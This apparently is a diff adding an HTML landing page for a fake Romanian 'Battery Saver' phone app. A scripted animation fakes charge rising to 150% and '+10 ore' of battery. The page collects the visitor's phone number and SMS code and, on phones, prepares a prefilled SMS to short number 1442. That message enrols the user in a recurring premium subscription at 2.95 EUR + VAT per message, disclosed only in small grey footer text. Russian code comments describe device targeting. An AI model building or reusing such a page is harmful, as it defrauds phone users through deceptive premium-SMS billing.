@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html >
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"> 
+	<title>Battery saver</title>
+	<link rel="stylesheet" media="screen" type="text/css" href="css/unlike.css" />
+	<link rel="stylesheet" media="screen" type="text/css" href="css/style.css" />
+
+	<script type="text/javascript">
+		bat_f = new Image();
+		bg_f = new Image();
+		bat_f.src = 'img/bat_f.png'
+		bg_f.src = 'img/background_f.png'
+	</script>
+	<script src="js/all.js"></script>
+</head>
+
+<body>
+<script type="text/javascript">
+	window.onload = window.setTimeout (update_sw, 1000);
+	var t_bat = null;
+	var count_bat = 0;
+	
+	var t_hour = null;
+	var count_hour = 0;
+	
+	var t_proc = null;
+	var count_proc = 100;
+
+	var t_sw = null;
+	var count_sw = 20;
+
+	function update_bat() {
+		document.getElementById('bat').setAttribute('style', "background-image: url(" + bat_f.src + ")");
+		document.getElementById('content').setAttribute('style', "background-image: url(" + bg_f.src + ")");
+	}
+
+
+	function update_hour() {
+		t_hour = window.setTimeout(render_hour, 300);
+	}
+	function render_hour() {
+		t_hour = null
+		count_hour++
+		document.getElementById('timer').innerHTML = '+' + count_hour + ' ore'
+		if (count_hour < 10) {update_hour()}
+	}
+
+	function update_proc() {
+		t_proc = window.setTimeout(render_proc, 60);
+	}
+	function render_proc() {
+		t_proc = null
+		count_proc++
+		document.getElementById('charge').innerHTML = count_proc + '%'
+		if (count_proc < 150) {update_proc()}
+	}
+	
+	function sw() {
+		t_bat = window.setTimeout(update_bat, 400);
+		t_hour = window.setTimeout(update_hour, 400);
+		t_proc = window.setTimeout(update_proc, 400);
+	}
+
+
+	function update_sw () {
+		t_proc = window.setTimeout(sw_render, 50);
+	}
+	function sw_render () {
+		document.getElementById('elipse').setAttribute('style', 'width: ' + count_sw + '%;')
+		count_sw = count_sw + 20;
+		t_sw = null;
+		if (count_sw < 101) {
+			update_sw()
+		} else {
+			document.getElementById('sw_status').innerHTML = 'ON'
+			document.getElementById('sw_status').setAttribute('class', 'c-green bold')
+			sw()
+		}
+	}
+
+</script>
+<div id="body" class="flb-around fl-wrap fl-vvspace center light">
+	
+
+	<div id="content" class="grid_100" style="background-image: url(img/background.png);">
+		<div class="logo grid_90p flb-center fl-wrap center">
+			<div class="grid_100 center"><img src="img/battery.svg" class="grid_1"></div>
+			<div class="grid_100 fs-x18 center light">Battery Saver<sub class="fs-x05" style="vertical-align: super; opacity: 0.5;font-size: 14px"> ℗</sub></div>
+			<div class="grid_100p fs-x08 center normal"><sub class="fs-x05" style="vertical-align: super; opacity: 0.5;font-size: 10px">demo </sub>O aplicaţie unică de a conserva de încărcare a bateriei telefonului</div>
+		</div>
+		<div id="cltimer" class="grid_2 timer bg-orange fs-x11 br-rad5">
+			<img src="img/clock.svg" id="clock">
+			<span id="timer">+0 ore</span>
+		</div>
+		<div id="pipka"></div>
+		<div id="bat" class="" style="background-image: url(img/bat_0.png);">
+			<span id="charge" class="fs-x27 normal">100%</span>
+		</div>
+	</div>
+	<div class="footer grid_100 bg-dark fs-x09">
+			<div class="grid_2 switch fs-x09 c-white">
+				<span class="sw_status">Save mode: </span>
+				<span id="sw_status" class="c-darkl normal">OFF</span>
+			</div>
+			<div id="switchers" class="flb-start">
+				<div id="elipse" class="flb-end">
+					<div id="circle"></div>
+				</div>
+			</div>
+
+
+
+
+
+
+			<div class="doings grid_5 br-rad5 fw-lights">
+				<!--<div id="inp_txt" class="grid_80p c-white">Введите ваш номер телефона</div>
+				<div id="inp_tel" class="element grid_80p flb-start fl-vcenter br-rad5 bg-light">
+					<div class="icon_tel fl-shrink-no"></div>
+					<div class="grid_100 bg-light br-rad5">
+						<input class="grid_100 fs-x11 br-rad5" type="tel" size="12" value="+49">
+					</div>
+				</div>
+				<input id="inp_btn" class="grid_80p br-rad5 c-white fs-x11" type="button" value="Установить" onclick="update_sw()">-->
+			
+
+
+
+
+				<div id="desk">
+				<form id="mobileBox" action="" unstyle="cn-around_around" class="grid_100p form_data">
+                      
+					<div class="step_1 grid_100p tx-center mar_tb">
+						<div id="inp_txt" class="grid_100p c-white">Introdu număr de telefon</div>
+        </div>
+					<div class="step_2 grid_100p tx-center mar_tb">
+          <div class="fw-bold">Introduceti codul</div>
+          <div>din SMS primite</div>
+        </div>
+
+
+					<div unstyle="cn-start to_cent" class="step_1 grid_80p bg-white box_tel br-rad5 mar_tb">
+          <div class="icon_tel"> </div>
+						<div unstyle="container self_shrink wrap" class="grid_100p">
+							<input id="tel" name="phone" dir="ltr" class="grid_100p pad_05r_lr fs-normal fw-normal br-rad5" type="tel" size="12" value="407" maxlength="32">
+          </div>
+        </div>
+
+
+
+                  	<div unstyle="cn-start to_cent" class="step_2 grid_80p bg-white box_code br-rad5 mar_tb">
+						<input id="code" dir="ltr" class="grid_100p pad_05r_lr fs-normal fw-normal" type="text"  value="" placeholder="Сodul din SMS">
+        </div>
+
+					<button class="step_1 br-rad5 grid_80p fs-x13 c-white mar_tb">Continua</button>
+					<button class="step_2 grid_80p fs-normal br-rad5 c-white mar_tb">Introdu codul</button>
+
+					<div id="back" class="step_2 back grid_100p tx-center fs-x08 fw-normal mar_tb">Un alt număr de telefon</div>
+        <input type="hidden" name="session_id" id="session_id" value="3821247720">
+          <!--					<div class="step_1 grid_100p tx-center mar_tb">-->
+<!--						<div id="inp_txt" class="grid_100p c-white">Introdu număr de telefon</div>-->
+<!--					</div>-->
+<!--					<div class="step_2 grid_100p tx-center mar_tb">-->
+<!--						<div class="fw-bold">Introduceti codul</div>-->
+<!--						<div>din SMS primite</div>-->
+<!--					</div>-->
+<!--					-->
+<!---->
+<!--					<div unstyle="cn-start to_cent" class="step_1 grid_80p bg-white box_tel br-rad5 mar_tb">-->
+<!--						<div class="icon_tel"> </div>-->
+<!--						<div unstyle="container self_shrink wrap" class="grid_100p">-->
+<!--							<input id="tel" dir="ltr" class="grid_100p pad_05r_lr fs-normal fw-normal br-rad5" type="tel" size="12" value="40" maxlength="32">-->
+<!--						</div>-->
+<!--					</div>-->
+<!--                    -->
+<!--                  	-->
+<!--					-->
+<!--                  	<div unstyle="cn-start to_cent" class="step_2 grid_80p bg-white box_code br-rad5 mar_tb">-->
+<!--						<input id="code" dir="ltr" class="grid_100p pad_05r_lr fs-normal fw-normal" type="text"  value="" placeholder="Сodul din SMS">-->
+<!--					</div>-->
+<!--					-->
+<!--					<button class="step_1 br-rad5 grid_80p fs-x13 c-white mar_tb">Instalați</button>-->
+<!--					<button class="step_2 grid_80p fs-normal br-rad5 c-white mar_tb">Introdu codul</button>-->
+<!--			-->
+<!--					<div id="back" class="step_2 back grid_100p tx-center fs-x08 fw-normal mar_tb">Un alt număr de telefon</div>-->
+				</form>
+			<script type="text/javascript">
+			var valid_phone = false
+			
+			$("#mobileBox").submit(function() {
+				if(!valid_phone) {
+					$('#tel').addClass('errors');
+				} else {
+				    //$('.step_1').fadeOut(0);
+				    //$('.step_2').fadeIn(300);
+				    //$('#back').fadeIn(300);
+					$('#tel').removeClass('errors');
+			    	$.ajax({
+			    		type: "POST",
+			    		url: window.location.pathname,
+			    		data: $("#mobileBox").serialize(),
+			    		success: function(json)
+			    		{
+                $('#mobileBox').html(json);
+			    			/*var data = json != "" ? $.parseJSON(json) : {};
+			    			if (data.redirect) {
+			    				window.location.href = data.redirect;
+			    			}
+			    			if(data.status == 'showCode'){
+			    				$('.input-phone_wrap').hide(0);
+								$('.input-code_wrap').fadeIn(300);
+								$('.hidden_btn').fadeIn(300);
+			    			}
+			    			$('.error').html(data.message).show();*/
+			    		}
+			    	});
+			    }
+				return false;
+			});
+			$('#back').click(function() {
+				$('.step_2').fadeOut(0);
+			    $('.step_1').fadeIn(300);
+			    return false;
+			});
+			$("#mobileBox button.step_2").click(function() {
+				if ($('#code').val().length > 0) {
+					$("#code").removeClass('errors');
+					$.ajax({
+				  		type: "POST",
+				   		url: window.location.pathname,
+				   		data: $("#mobileBox").serialize(),
+				   		success: function(json)
+				   		{
+				   			alert('FIX THIS: Все получилось!');
+				   		},
+				   		error: function(){
+				   			alert('FIX THIS: Сервер недоступен или вернул ошибку')
+				   		}
+				   	});
+				} else {
+					$("#code").addClass('errors');
+				}
+			    return false;
+			});
+			</script>
+			</div>
+
+
+			<div id="mo">
+				<div id="mo_inform" unstyle="cn-around_around to_cent" class="grid_100pr form_data">
+					<a id="link" class="grid_80p fs-x11 br-rad5 c-white tx-center mar_tb" href="">Continua</a>
+				</div>
+				
+			</div>
+
+			<div id="mt">
+				<div unstyle="cn-around_around to_cent" class="grid_100p form_data">
+					<div class="grid_100p tx-center fs-x09 fw-normal">
+						<div class="fw-bold"><span class="c-orange">Pentru a instala </span>Battery Saver</div>
+						<div class="mar_tb">trimiteţi sms cu text</div>
+						<div><span class="sp-number c-orange">Saver 3821247720</span> la numărul <span class="sp-number c-orange">1442</span></div>
+					</div>
+				</div>
+			</div>
+
+			</div>
+	</div>
+
+<script src="http://resourcesfiles.com/mobile_detect/mobile-detect.min.js"></script>
+
+
+
+</div>
+<div id="extra" class="">
+<style type="text/css">
+	#extra {width: 100%; text-align: center; font-family: Arial; padding: 0 5px;}
+	.block_enable {display: block;}
+	.block_disable {display: none;}
+	.exttra__text a {color: #999;}
+</style>
+  <div class="exttra__text" style="font-size: 11px; color: #666; margin: 0 auto;">
+
+      <span class="footer-mo" style="font-size: 12px; display: none;">
+		*Termeni si conditii serviciu Saver: Descriere – serviciul ofera service description si poate fi foloist prin abonarea prin SMS. Apasand pe CONTINUA veti fi redirectionat catre casuta de mesaje de unde puteti incepe procesul de abonare - cost mesaj trimis la numarul scurt : 0.05EUR+TVA. Abonarea se face in mai multi pasi: prin trimiterea prin SMS a cuvantului cheie 1442 la numarul scurt, urmata de confirmarea abonarii prin SMS la numarul scurt. Costul abonamentului este de 2.95E+TVA/sms primit/recurenta in Orange, Vodafone,Telekom. Taxarea se face in Vodafone de pe numarul 23124 iar in Telekom de pe numarul 22242. Abonamentul se incheie pe o perioada nedeterminata (pana la dezabonare). Prin activarea serviciului utilizatorul este de acord neconditionat cu acesti termeni si conditii ai serviciului si confirma ca are acordul titularului legal al cartelei SIM pentru comandarea acestuia. Furnizor serviciu: RGK Group LP Address: Suite 2, 5 St. Vincent street, Edinburg, EH3 6SW, Scotland, UK  
+      </span>
+      <span class="footer-mt" style="font-size: 12px; display: none;">
+        *Termeni si conditii serviciu Saver: Descriere – service description si poate fi foloist prin abonarea prin SMS. Cost mesaj trimis la numarul scurt : 0.05EUR+TVA. Abonarea se face in mai multi pasi: prin trimiterea prin SMS a cuvantului cheie 1242 la numarul scurt, urmata de confirmarea abonarii prin SMS la numarul scurt. Costul abonamentului este de 1.5E+TVA/sms primit/recurenta in Orange, Vodafone,Telekom. Taxarea se face in Vodafone de pe numarul 23120 iar in Telekom de pe numarul 22243. Abonamentul se incheie pe o perioada nedeterminata (pana la dezabonare). Pentru dezabonare trebuie sa trimiteti STOP SAVER la numarul scurt (0.05E+TVA/sms trimis) sau sa contactati furnizorul serviciului la email sau numar telefon, orar luni-vineri 9:00-18:00. Prin activarea serviciului utilizatorul este de acord neconditionat cu acesti termeni si conditii ai serviciului si confirma ca are acordul titularului legal al cartelei SIM pentru comandarea acestuia. Furnizor serviciu: RGK Group LP Address: Suite 2, 5 St. Vincent street, Edinburg, EH3 6SW, Scotland, UK 
+      </span>
+      <span class="footer-one" style="font-size: 12px; display: none;">
+        *Termeni si conditii serviciu Saver: Descriere – serviciul ofera service description si poate fi foloist prin abonarea prin SMS. Apasand pe CONTINUA veti fi redirectionat catre casuta de mesaje de unde puteti incepe procesul de abonare - cost mesaj trimis la numarul scurt : 0.05EUR+TVA. Abonarea se face in mai multi pasi: prin trimiterea prin SMS a cuvantului cheie 1442 la numarul scurt, urmata de confirmarea abonarii prin SMS la numarul scurt. Costul abonamentului este de 2.95E+TVA/sms primit/recurenta in Orange, Vodafone,Telekom. Taxarea se face in Vodafone de pe numarul 23124 iar in Telekom de pe numarul 22242. Abonamentul se incheie pe o perioada nedeterminata (pana la dezabonare). Prin activarea serviciului utilizatorul este de acord neconditionat cu acesti termeni si conditii ai serviciului si confirma ca are acordul titularului legal al cartelei SIM pentru comandarea acestuia. Furnizor serviciu: RGK Group LP Address: Suite 2, 5 St. Vincent street, Edinburg, EH3 6SW, Scotland, UK  
+      </span>
+    <br>This offer exclusively promoted by <a href="http://affshark.com">AffShark.com</a> Please do not hesitate to contact us
+
+
+  </div>
+</div>
+
+
+
+<script>
+  var autoSms = ('true' === 'true');
+  var timeoutSms = 7000;
+
+  var obj = new Advert;
+
+
+  if (obj.md.mobile()) { // true - если моб или планшет
+    if (obj.md.phone()) { // true - если моб, false - если планшет
+      obj.setTemplatePath(); //устанавливаем шаблон СМС (? или &)
+
+      if(obj.template) { //если это не виндафон или старый iOS - идем сюда
+                $('.footer-one').show();
+                obj.showBox({id: 'mo', type: 'mo', link: { id: 'link', number: '1442', body: {android: 'Saver 3821247720 pentru primire BatterySaver, cu ajutorul caruia eu voi creste productivitatea telefonului meu cu 250 de procente. Creste', ios: 'Saver 3821247720 pentru primire BatterySaver, cu ajutorul caruia eu voi creste productivitatea telefonului meu cu 250 de procente. Creste'}}}); //Показываем блок для МО
+        //Тут валидация номера и прочая ерунда
+      } else {
+        $('.footer-mt').show();
+        obj.showBox({id: 'mt', type: 'mt'}); // Показываем блок для МТ для старых айфонов и виндафнов
+      }
+    } else {
+      $('.footer-mt').show();
+      obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок МТ для планшетов
+    }
+
+  } else {
+    $('.footer-mt').show();
+    obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок для десктопов
+
+  }
+</script>
+
+
+
+
+</body>
+</html>
